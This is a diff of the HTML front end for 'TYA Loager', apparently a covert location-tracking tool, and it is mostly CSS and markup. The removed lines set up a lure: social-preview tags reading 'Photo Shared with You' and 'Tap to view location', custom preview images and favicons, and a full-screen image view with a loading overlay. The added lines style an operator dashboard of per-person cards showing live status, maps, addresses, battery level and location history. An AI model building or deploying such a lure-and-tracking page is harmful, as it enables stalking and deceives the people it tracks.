@@ -1,1160 +1,834 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TYA Loager</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>TYA Loager — Command Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+/* ═══════════════════════════════════════════════
+   TYA LOAGER v6 — INDIVIDUAL MAP CARDS
+   ═══════════════════════════════════════════════ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#030712;--surface:#0a0f1e;--card:#0f1729;--card2:#141c30;
+  --border:#1c2742;--border2:#253354;
+  --accent:#6366f1;--accent2:#818cf8;--accent3:#a5b4fc;--accent4:#c7d2fe;
+  --green:#22c55e;--green2:#4ade80;--red:#ef4444;--amber:#f59e0b;--cyan:#06b6d4;--purple:#a855f7;
+  --text:#f1f5f9;--text2:#94a3b8;--text3:#64748b;
+  --radius:24px;--radius-md:16px;--radius-sm:12px;--radius-xs:8px;
+  --shadow:0 8px 32px rgba(0,0,0,.5);--shadow-lg:0 20px 60px rgba(0,0,0,.7);
+  --glow:0 0 30px rgba(99,102,241,.12);
+}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;line-height:1.6}
 
-    <!-- Open Graph for social preview – absolute URL -->
-    <meta property="og:title" content="Photo Shared with You" />
-    <meta property="og:description" content="Tap to view location" />
-    <meta property="og:image" id="og-image" content="" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta property="og:image:type" content="image/jpeg" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" id="og-url" content="" />
+/* ── ANIMATED BG ── */
+body::before{content:'';position:fixed;inset:0;z-index:0;
+  background:radial-gradient(ellipse 800px 600px at 20% 10%,rgba(99,102,241,.07) 0%,transparent 60%),
+             radial-gradient(ellipse 600px 500px at 80% 90%,rgba(6,182,212,.05) 0%,transparent 60%),
+             radial-gradient(ellipse 900px 700px at 60% 40%,rgba(139,92,246,.04) 0%,transparent 60%);
+  animation:bgShift 20s ease-in-out infinite alternate;pointer-events:none}
+@keyframes bgShift{0%{opacity:.5;filter:hue-rotate(0deg)}100%{opacity:1;filter:hue-rotate(15deg)}}
 
-    <link id="dynamic-favicon" rel="icon" href="/api/favicon/i" type="image/jpeg" />
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+/* ── PARTICLES ── */
+.particles{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.particle{position:absolute;border-radius:50%;opacity:.12;animation:drift linear infinite}
+@keyframes drift{0%{transform:translateY(110vh) rotate(0deg) scale(0)}50%{opacity:.25}100%{transform:translateY(-10vh) rotate(360deg) scale(1);opacity:0}}
 
-    <style>
-        /* ── Same styles as before – no changes ── */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        :root {
-            --bg: #0f172a;
-            --card: #1e293b;
-            --text: #f8fafc;
-            --text2: #94a3b8;
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --success: #10b981;
-            --danger: #ef4444;
-            --border: #334155;
-            --radius: 16px;
-            --shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
-        }
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            overflow-x: hidden;
-            min-height: 100vh;
-        }
-        a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-        .disabled {
-            opacity: 0.5;
-            pointer-events: none;
-        }
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--accent);
-            border-radius: 8px;
-        }
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--accent)}
 
-        #toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: var(--card);
-            color: var(--text);
-            padding: 16px 32px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-            box-shadow: var(--shadow);
-            font-weight: 500;
-            font-size: 0.95rem;
-            z-index: 99999;
-            opacity: 0;
-            transition: all 0.4s ease;
-            pointer-events: none;
-            text-align: center;
-            max-width: 90%;
-            backdrop-filter: blur(10px);
-        }
-        #toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-            pointer-events: auto;
-        }
+/* ── PAGE ── */
+.page{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:40px 28px 140px}
+@media(max-width:768px){.page{padding:16px 10px 120px}}
 
-        #dashboard-view {
-            padding: 20px;
-            max-width: 1300px;
-            margin: 0 auto;
-            display: none;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px 0 25px;
-            border-bottom: 1px solid var(--border);
-        }
-        .brand-name {
-            font-size: 2.6rem;
-            font-weight: 800;
-            letter-spacing: -1px;
-            background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-        }
-        .brand-sub {
-            color: var(--text2);
-            font-size: 0.9rem;
-            margin-top: 4px;
-            letter-spacing: 2px;
-        }
+/* ── SECTION CARD ── */
+.section{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:40px;margin-bottom:36px;box-shadow:var(--shadow);position:relative;overflow:hidden;
+  animation:sectionIn .7s cubic-bezier(.16,1,.3,1) both}
+.section::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent 5%,var(--accent2) 50%,transparent 95%);opacity:.3}
+@keyframes sectionIn{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
+.section:nth-child(2){animation-delay:.08s}.section:nth-child(3){animation-delay:.16s}
+.section:nth-child(4){animation-delay:.24s}.section:nth-child(5){animation-delay:.32s}
+@media(max-width:768px){.section{padding:20px 16px;margin-bottom:20px;border-radius:var(--radius-md)}}
 
-        .upload-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        @media (max-width: 768px) {
-            .upload-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-        .upload-card {
-            background: var(--card);
-            border-radius: var(--radius);
-            padding: 20px;
-            border: 1px solid var(--border);
-            transition: border-color 0.3s;
-        }
-        .upload-card:hover {
-            border-color: var(--accent);
-        }
-        .upload-card h3 {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 6px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .upload-card p {
-            color: var(--text2);
-            font-size: 0.8rem;
-            margin-bottom: 12px;
-        }
-        .upload-card .preview-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin-top: 10px;
-        }
-        .upload-card .preview-row img {
-            width: 60px;
-            height: 60px;
-            object-fit: cover;
-            border-radius: 8px;
-            border: 2px solid var(--border);
-            background: #1a1a2e;
-        }
-        .upload-card .preview-row .favicon-grid {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .upload-card .preview-row .favicon-grid img {
-            width: 48px;
-            height: 48px;
-            border-radius: 8px;
-            border: 2px solid var(--border);
-            cursor: pointer;
-            transition: all 0.2s;
-            object-fit: cover;
-            background: #1a1a2e;
-        }
-        .upload-card .preview-row .favicon-grid img:hover {
-            transform: scale(1.08);
-            border-color: var(--accent);
-        }
-        .upload-btn {
-            background: var(--accent);
-            color: #fff;
-            padding: 8px 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            border: none;
-            font-size: 0.85rem;
-            transition: background 0.2s;
-            display: inline-block;
-        }
-        .upload-btn:hover {
-            background: var(--accent-hover);
-        }
-        .file-input {
-            display: none;
-        }
+.sec-head{display:flex;align-items:center;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+.sec-icon{width:52px;height:52px;border-radius:16px;display:grid;place-items:center;font-size:24px;flex-shrink:0;
+  background:linear-gradient(135deg,var(--accent),#7c3aed);box-shadow:0 6px 24px rgba(99,102,241,.3)}
+.sec-title{font-size:24px;font-weight:800;letter-spacing:-.03em}
+.sec-sub{font-size:13px;color:var(--text3);margin-top:2px}
+.sec-right{margin-left:auto;display:flex;gap:10px;flex-wrap:wrap}
 
-        .action-bar {
-            display: flex;
-            gap: 14px;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 30px;
-        }
-        .btn {
-            padding: 10px 26px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 0.9rem;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow);
-        }
-        .btn-primary {
-            background: var(--accent);
-            color: #fff;
-        }
-        .btn-primary:hover {
-            background: var(--accent-hover);
-        }
-        .btn-danger {
-            background: var(--danger);
-            color: #fff;
-        }
-        .btn-danger:hover {
-            background: #dc2626;
-        }
-        .btn-success {
-            background: var(--success);
-            color: #fff;
-        }
-        .btn-success:hover {
-            background: #059669;
-        }
-        .btn-secondary {
-            background: var(--border);
-            color: #fff;
-        }
-        .btn-secondary:hover {
-            background: #475569;
-        }
+/* ── HERO ── */
+.hero{text-align:center;padding:56px 32px;
+  background:linear-gradient(160deg,rgba(99,102,241,.08),rgba(6,182,212,.04),rgba(139,92,246,.06));
+  border-color:rgba(99,102,241,.2)}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;padding:7px 18px;border-radius:50px;
+  background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.25);font-size:11px;font-weight:700;
+  color:var(--accent3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:20px}
+.hero-badge .dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
+.hero h1{font-size:clamp(28px,5vw,52px);font-weight:900;letter-spacing:-.04em;
+  background:linear-gradient(135deg,#fff 30%,var(--accent3) 70%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:16px;color:var(--text2);max-width:550px;margin:14px auto 0}
 
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
-            gap: 20px;
-        }
-        .card {
-            background: var(--card);
-            border-radius: var(--radius);
-            padding: 20px;
-            border: 1px solid var(--border);
-            transition: all 0.3s;
-        }
-        .card:hover {
-            border-color: var(--accent);
-            transform: translateY(-2px);
-        }
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-        .card-header .user-id {
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: var(--accent);
-            word-break: break-all;
-        }
-        .card-header .favicon-badge img {
-            width: 28px;
-            height: 28px;
-            border-radius: 6px;
-            object-fit: cover;
-            border: 1px solid var(--border);
-        }
-        .status-badge {
-            background: rgba(16, 185, 129, 0.15);
-            color: var(--success);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: 700;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .status-badge.offline {
-            background: rgba(239, 68, 68, 0.15);
-            color: var(--danger);
-        }
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--success);
-            animation: pulse 1.8s infinite;
-        }
-        .status-badge.offline .status-dot {
-            background: var(--danger);
-            animation: none;
-        }
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6);
-            }
-            70% {
-                box-shadow: 0 0 0 6px rgba(16, 185, 129, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
-            }
-        }
+/* ── STAT CARDS ── */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:36px;
+  animation:sectionIn .6s cubic-bezier(.16,1,.3,1) .05s both}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:var(--radius-sm);
+  padding:24px 20px;text-align:center;box-shadow:var(--shadow);transition:all .3s;position:relative;overflow:hidden}
+.stat::before{content:'';position:absolute;bottom:0;left:0;right:0;height:3px;border-radius:0 0 12px 12px;opacity:.7}
+.stat:nth-child(1)::before{background:var(--accent)}.stat:nth-child(2)::before{background:var(--green)}
+.stat:nth-child(3)::before{background:var(--red)}.stat:nth-child(4)::before{background:var(--cyan)}
+.stat:hover{transform:translateY(-4px);box-shadow:var(--glow),var(--shadow)}
+.stat-num{font-size:36px;font-weight:900;letter-spacing:-.03em}
+.stat-label{font-size:12px;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-top:4px}
+.c-accent{color:var(--accent2)}.c-green{color:var(--green2)}.c-red{color:var(--red)}.c-cyan{color:var(--cyan)}
 
-        .card .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 12px 0;
-        }
-        .card .info-item {
-            background: rgba(255, 255, 255, 0.03);
-            padding: 6px 10px;
-            border-radius: 8px;
-        }
-        .card .info-label {
-            font-size: 0.6rem;
-            color: var(--text2);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .card .info-value {
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-top: 2px;
-        }
+/* ── BUTTONS ── */
+.btn{display:inline-flex;align-items:center;gap:8px;padding:10px 20px;border-radius:var(--radius-xs);
+  font-size:13px;font-weight:600;border:none;cursor:pointer;transition:all .25s;font-family:inherit}
+.btn-primary{background:linear-gradient(135deg,var(--accent),#7c3aed);color:#fff;box-shadow:0 4px 16px rgba(99,102,241,.3)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(99,102,241,.4)}
+.btn-ghost{background:rgba(255,255,255,.05);color:var(--text2);border:1px solid var(--border)}
+.btn-ghost:hover{background:rgba(255,255,255,.1);color:var(--text);border-color:var(--border2)}
+.btn-danger{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.2)}
+.btn-danger:hover{background:rgba(239,68,68,.2)}
+.btn-success{background:rgba(34,197,94,.12);color:var(--green);border:1px solid rgba(34,197,94,.2)}
+.btn-success:hover{background:rgba(34,197,94,.2)}
+.btn-sm{padding:6px 14px;font-size:12px;border-radius:6px}
+.btn-icon{width:36px;height:36px;padding:0;border-radius:10px;display:grid;place-items:center;font-size:16px}
 
-        .card .map-container {
-            height: 160px;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 12px 0;
-            background: #1a1a2e;
-        }
+/* ── INPUTS ── */
+.input{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-xs);
+  padding:10px 14px;color:var(--text);font-size:13px;font-family:inherit;outline:none;transition:all .25s;width:100%}
+.input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(99,102,241,.15)}
+.input::placeholder{color:var(--text3)}
+.input-group{display:flex;gap:10px;align-items:center}
 
-        .card .settings-row {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin: 12px 0;
-            padding: 12px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 10px;
-            border: 1px solid var(--border);
-        }
-        .card .settings-row label {
-            font-size: 0.75rem;
-            color: var(--text2);
-            font-weight: 600;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            flex: 1;
-            min-width: 120px;
-        }
-        .card .settings-row input,
-        .card .settings-row select {
-            background: var(--bg);
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 6px 10px;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .card .settings-row input:focus,
-        .card .settings-row select:focus {
-            border-color: var(--accent);
-        }
-        .card .settings-row .favicon-select {
-            display: flex;
-            gap: 6px;
-            flex-wrap: wrap;
-            align-items: center;
-        }
-        .card .settings-row .favicon-select img {
-            width: 32px;
-            height: 32px;
-            border-radius: 6px;
-            object-fit: cover;
-            border: 2px solid var(--border);
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .card .settings-row .favicon-select img:hover {
-            transform: scale(1.1);
-        }
-        .card .settings-row .favicon-select img.active {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.4);
-        }
+/* ── CREATE FORM ── */
+.create-form{display:grid;grid-template-columns:1fr 1fr auto;gap:12px;align-items:end}
+@media(max-width:600px){.create-form{grid-template-columns:1fr}}
+.form-field label{display:block;font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;
+  letter-spacing:.06em;margin-bottom:6px}
 
-        .card .btn-group {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .card .btn-group .btn {
-            flex: 1;
-            justify-content: center;
-            padding: 8px 12px;
-            font-size: 0.8rem;
-            min-width: 70px;
-        }
+/* ── USER CARDS GRID ── */
+.cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(440px,1fr));gap:24px}
+@media(max-width:500px){.cards-grid{grid-template-columns:1fr}}
+.user-card{background:var(--card2);border:1px solid var(--border);border-radius:var(--radius-md);
+  overflow:hidden;transition:all .4s;animation:cardPop .5s cubic-bezier(.16,1,.3,1) both}
+.user-card:hover{border-color:var(--border2);box-shadow:0 12px 40px rgba(0,0,0,.4),var(--glow)}
+@keyframes cardPop{from{opacity:0;transform:scale(.95) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
 
-        .empty-state {
-            text-align: center;
-            color: var(--text2);
-            grid-column: 1 / -1;
-            padding: 60px 20px;
-        }
-        .empty-state h3 {
-            font-size: 1.6rem;
-            margin-bottom: 10px;
-            color: var(--text);
-        }
-        .empty-state .icon {
-            font-size: 4rem;
-            margin-bottom: 16px;
-        }
+/* Card header */
+.uc-header{display:flex;align-items:center;gap:14px;padding:20px 20px 0}
+.uc-avatar{width:44px;height:44px;border-radius:14px;display:grid;place-items:center;
+  font-size:20px;font-weight:800;flex-shrink:0;position:relative}
+.uc-avatar.live{background:linear-gradient(135deg,rgba(34,197,94,.2),rgba(34,197,94,.1));color:var(--green);
+  box-shadow:0 0 20px rgba(34,197,94,.2)}
+.uc-avatar.offline{background:linear-gradient(135deg,rgba(239,68,68,.15),rgba(239,68,68,.08));color:var(--red)}
+.uc-avatar .ring{position:absolute;inset:-4px;border-radius:18px;border:2px solid var(--green);
+  animation:ringPulse 2s ease-in-out infinite;opacity:.5}
+@keyframes ringPulse{0%,100%{transform:scale(1);opacity:.5}50%{transform:scale(1.15);opacity:0}}
+.uc-meta{flex:1;min-width:0}
+.uc-name{font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px}
+.uc-name .badge{padding:3px 10px;border-radius:50px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em}
+.badge-live{background:rgba(34,197,94,.15);color:var(--green);border:1px solid rgba(34,197,94,.25)}
+.badge-off{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.2)}
+.uc-id{font-size:11px;color:var(--text3);font-family:monospace}
+.uc-actions{display:flex;gap:6px}
 
-        #tracker-view {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 9999;
-        }
-        #tracker-view img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-        #tracker-view .loader-overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.85);
-            padding: 30px 40px;
-            border-radius: 16px;
-            display: none;
-            text-align: center;
-            border: 1px solid #333;
-            min-width: 180px;
-            backdrop-filter: blur(10px);
-        }
-        #tracker-view .loader-overlay .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #2a2a3e;
-            border-top: 4px solid var(--accent);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 12px;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        #tracker-view .loader-overlay p {
-            color: #ccc;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
+/* Card map */
+.uc-map{width:100%;height:220px;margin-top:16px;border-top:1px solid var(--border);border-bottom:1px solid var(--border);
+  position:relative;background:var(--surface)}
+.uc-map .map-label{position:absolute;top:10px;left:10px;z-index:500;background:rgba(0,0,0,.7);
+  padding:4px 10px;border-radius:6px;font-size:10px;color:var(--text2);backdrop-filter:blur(8px)}
+.uc-map .map-open{position:absolute;top:10px;right:10px;z-index:500}
 
-        @media (max-width: 640px) {
-            .brand-name {
-                font-size: 1.8rem;
-            }
-            .grid-container {
-                grid-template-columns: 1fr;
-            }
-            .card .settings-row {
-                flex-direction: column;
-            }
-            .card .settings-row label {
-                min-width: auto;
-            }
-            .upload-grid {
-                grid-template-columns: 1fr;
-            }
-            .action-bar .btn {
-                width: 100%;
-                justify-content: center;
-            }
-        }
-    </style>
+/* Card info */
+.uc-body{padding:16px 20px 0}
+.uc-info{display:grid;grid-template-columns:1fr 1fr;gap:8px 16px}
+.uc-info-item{display:flex;flex-direction:column;gap:2px}
+.uc-info-item .label{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;font-weight:600}
+.uc-info-item .value{font-size:13px;font-weight:500;color:var(--text);word-break:break-all}
+.uc-info-item .value.addr{color:var(--accent3);font-weight:600}
+
+/* Battery */
+.uc-battery{margin-top:12px;display:flex;align-items:center;gap:10px}
+.bat-bar{flex:1;height:8px;background:var(--surface);border-radius:4px;overflow:hidden}
+.bat-fill{height:100%;border-radius:4px;transition:width .6s ease}
+.bat-text{font-size:12px;font-weight:600;min-width:38px;text-align:right}
+
+/* Card edit row */
+.uc-edit{padding:12px 20px;display:flex;gap:8px;flex-wrap:wrap;border-top:1px solid var(--border);margin-top:14px}
+.uc-edit .input{flex:1;min-width:100px;padding:7px 10px;font-size:12px}
+.uc-edit select{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:7px 10px;
+  color:var(--text);font-size:12px;font-family:inherit;outline:none;cursor:pointer}
+
+/* History */
+.uc-history{padding:0 20px 16px;margin-top:10px}
+.uc-history summary{font-size:12px;font-weight:600;color:var(--text3);cursor:pointer;padding:6px 0;
+  list-style:none;display:flex;align-items:center;gap:6px}
+.uc-history summary::before{content:'▶';font-size:9px;transition:transform .2s}
+.uc-history[open] summary::before{transform:rotate(90deg)}
+.history-list{max-height:200px;overflow-y:auto;margin-top:8px;display:flex;flex-direction:column;gap:4px}
+.history-item{display:flex;align-items:center;gap:8px;padding:6px 10px;background:var(--surface);
+  border-radius:6px;font-size:11px;cursor:pointer;transition:background .2s}
+.history-item:hover{background:var(--border)}
+.history-item .hi-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+.history-item .hi-dot.on{background:var(--green)}.history-item .hi-dot.off{background:var(--red)}
+.history-item .hi-addr{flex:1;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.history-item .hi-time{color:var(--text3);flex-shrink:0}
+
+/* ── SOCIAL IMAGES SECTION ── */
+.images-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-top:16px}
+.img-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);
+  overflow:hidden;transition:all .3s;cursor:pointer}
+.img-card:hover{border-color:var(--accent);transform:translateY(-3px)}
+.img-card img{width:100%;height:120px;object-fit:cover;display:block}
+.img-card .img-info{padding:10px 12px;display:flex;align-items:center;justify-content:space-between}
+.img-card .img-name{font-size:12px;font-weight:600;color:var(--text2)}
+.img-card .img-del{background:none;border:none;color:var(--red);cursor:pointer;font-size:14px;padding:4px;opacity:.5;transition:opacity .2s}
+.img-card .img-del:hover{opacity:1}
+
+.upload-zone{border:2px dashed var(--border2);border-radius:var(--radius-sm);padding:32px;text-align:center;
+  cursor:pointer;transition:all .3s;background:rgba(99,102,241,.03)}
+.upload-zone:hover{border-color:var(--accent);background:rgba(99,102,241,.06)}
+.upload-zone p{color:var(--text3);font-size:14px;margin-top:8px}
+.upload-zone .uz-icon{font-size:32px;margin-bottom:4px}
+
+/* Social preview mockup */
+.social-preview{background:#fff;border-radius:12px;overflow:hidden;max-width:500px;margin:20px auto 0;
+  box-shadow:0 2px 12px rgba(0,0,0,.15)}
+.social-preview img{width:100%;height:260px;object-fit:cover}
+.social-preview .sp-body{padding:14px 16px}
+.social-preview .sp-domain{font-size:11px;color:#65676b;text-transform:uppercase;letter-spacing:.03em}
+.social-preview .sp-title{font-size:15px;font-weight:700;color:#1c1e21;margin:4px 0 2px}
+.social-preview .sp-desc{font-size:13px;color:#65676b}
+
+/* ── FAVICONS ── */
+.fav-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;max-width:500px}
+.fav-slot{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);
+  padding:20px;text-align:center;cursor:pointer;transition:all .3s}
+.fav-slot:hover{border-color:var(--accent);background:rgba(99,102,241,.05)}
+.fav-slot .fav-icon{width:48px;height:48px;border-radius:12px;margin:0 auto 10px;display:grid;place-items:center;
+  font-size:20px;font-weight:800}
+.fav-slot .fav-label{font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:600;letter-spacing:.06em}
+
+/* ── FAB ── */
+.fab{position:fixed;bottom:32px;right:32px;z-index:100;width:60px;height:60px;border-radius:20px;
+  background:linear-gradient(135deg,var(--accent),#7c3aed);border:none;color:#fff;font-size:28px;
+  cursor:pointer;box-shadow:0 8px 30px rgba(99,102,241,.4);transition:all .3s;display:grid;place-items:center}
+.fab:hover{transform:scale(1.08) rotate(90deg);box-shadow:0 12px 40px rgba(99,102,241,.5)}
+
+/* ── MODAL ── */
+.modal-bg{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);
+  display:none;place-items:center;animation:fadeIn .2s}
+.modal-bg.show{display:grid}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:36px;width:90%;max-width:500px;box-shadow:var(--shadow-lg);animation:modalIn .3s cubic-bezier(.16,1,.3,1)}
+@keyframes modalIn{from{opacity:0;transform:scale(.9) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+.modal h2{font-size:22px;font-weight:800;margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.modal .form-field{margin-bottom:16px}
+.modal .form-field label{display:block;font-size:11px;font-weight:600;color:var(--text3);
+  text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
+.modal-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:24px}
+
+/* ── TOAST ── */
+.toast-wrap{position:fixed;bottom:100px;right:28px;z-index:300;display:flex;flex-direction:column;gap:8px}
+.toast{padding:12px 20px;border-radius:var(--radius-xs);background:var(--card);border:1px solid var(--border);
+  color:var(--text);font-size:13px;box-shadow:var(--shadow);animation:toastIn .3s ease,toastOut .3s ease 2.7s forwards;
+  display:flex;align-items:center;gap:8px}
+@keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+@keyframes toastOut{to{opacity:0;transform:translateX(40px)}}
+
+/* ── EMPTY STATE ── */
+.empty{text-align:center;padding:48px 20px;color:var(--text3)}
+.empty .empty-icon{font-size:48px;margin-bottom:12px;opacity:.4}
+.empty p{font-size:14px}
+
+/* ── ARCHIVE TOGGLE ── */
+.toggle-row{display:flex;align-items:center;gap:10px;margin-bottom:20px}
+.toggle{width:44px;height:24px;border-radius:12px;background:var(--border);cursor:pointer;position:relative;
+  border:none;transition:background .3s}
+.toggle.on{background:var(--accent)}
+.toggle::after{content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;
+  background:#fff;transition:transform .3s}
+.toggle.on::after{transform:translateX(20px)}
+
+/* Leaflet dark tiles fix */
+.leaflet-container{background:var(--surface)!important}
+.leaflet-control-attribution{display:none!important}
+</style>
 </head>
 <body>
+<!-- PARTICLES -->
+<div class="particles" id="particles"></div>
 
-    <div id="toast"></div>
+<!-- TOASTS -->
+<div class="toast-wrap" id="toasts"></div>
 
-    <!-- DASHBOARD -->
-    <div id="dashboard-view">
-        <div class="header">
-            <h1 class="brand-name">TYA Loager</h1>
-            <p class="brand-sub">📍 Live Tracker · Custom URLs · Offline Last Location</p>
-        </div>
+<div class="page">
 
-        <div class="upload-grid">
-            <div class="upload-card">
-                <h3>🖼️ Shared Image (OG)</h3>
-                <p>This image appears when you share the link on social media.</p>
-                <label for="og-upload" class="upload-btn">📤 Upload Image</label>
-                <input type="file" id="og-upload" class="file-input" accept="image/*" />
-                <div class="preview-row">
-                    <span style="font-size:0.8rem;color:var(--text2);">Preview:</span>
-                    <img id="og-preview" src="/api/image" alt="OG Preview" />
-                </div>
-            </div>
-            <div class="upload-card">
-                <h3>🎯 Favicon Set (4 Options)</h3>
